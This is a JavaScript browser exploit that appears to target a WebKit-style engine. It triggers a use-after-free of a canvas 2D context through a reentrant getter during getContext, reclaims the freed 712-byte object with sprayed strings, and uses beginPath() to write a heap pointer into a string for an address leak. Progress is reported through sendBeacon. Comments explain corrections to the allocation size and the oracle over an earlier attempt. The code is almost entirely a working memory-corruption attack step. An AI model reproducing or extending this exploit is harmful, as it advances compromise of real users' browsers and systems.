// Reclaim the freed 712-byte CanvasRenderingContext2D with strings, and use beginPath() as an overlap oracle.
//
// Two corrections over the previous attempt:
//  1. The object is 712 bytes (ASAN: CanvasRenderingContext2D::operator new -> WTF::fastMalloc(712) at
//     CanvasRenderingContext2D.cpp:73), not 768. Every earlier spray used the wrong size, which is why the
//     slot was never reclaimed.
//  2. Writing lineWidth is a bad oracle: it dereferences m_state (a pointer into a separate stateStack
//     allocation), so it faults whether or not the object itself was reclaimed. beginPath() instead stores a
//     freshly allocated Path pointer INTO the object, so if our string occupies that memory the string's own
//     characters change - which is observable from JS and doubles as a heap-pointer leak.
//
// Lengths are spread across the plausible size classes so one of them lands in whatever class holds 712.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', 'c016-' + t); } catch (e) {} }
  send('boot');

  function trigger() {
    var inner = null;
    var c = document.createElement('canvas');
    var opts = {};
    Object.defineProperty(opts, 'alpha', { get: function () { inner = c.getContext('2d'); return true; } });
    try { c.getContext('bitmaprenderer', opts); } catch (e) {}
    return inner;
  }

  // A string of total allocation ~= len + StringImpl header. Sweep so every class from ~640 to ~1024 is covered.
  var lengths = [], L;
  for (L = 600; L <= 1010; L += 10) lengths.push(L);

  var inner = trigger();
  if (!inner) { send('no-context'); return; }
  send('triggered');

  var buckets = [];
  for (var i = 0; i < lengths.length; i++) {
    var n = lengths[i];
    // 'Z' fill: any byte that stops being 0x5A is something the engine wrote into our buffer.
    var s = new Array(n + 1).join('Z');
    var arr = new Array(160);
    for (var j = 0; j < arr.length; j++) arr[j] = s + String.fromCharCode(0x30 + (j % 10));
    buckets.push({ len: n, arr: arr });
    try { inner.beginPath(); } catch (e) { send('beginPath-threw@' + n); }
  }

  // Scan: a pointer written into a string shows up as bytes outside the 0x30-0x5A range we filled.
  var best = -1, bestLen = -1, bestOff = -1;
  for (var b = 0; b < buckets.length; b++) {
    var arr2 = buckets[b].arr, len = buckets[b].len;
    for (var k = 0; k < arr2.length; k++) {
      var str = arr2[k];
      var changed = -1;
      for (var p = 0; p < len; p++) {
        var code = str.charCodeAt(p);
        if (code !== 0x5A && !(code >= 0x30 && code <= 0x39)) { changed = p; break; }
      }
      if (changed >= 0) { best = k; bestLen = len; bestOff = changed; break; }
    }
    if (best >= 0) break;
  }
  send('scan:idx=' + best + ' len=' + bestLen + ' off=' + bestOff);
  send('done');
})();
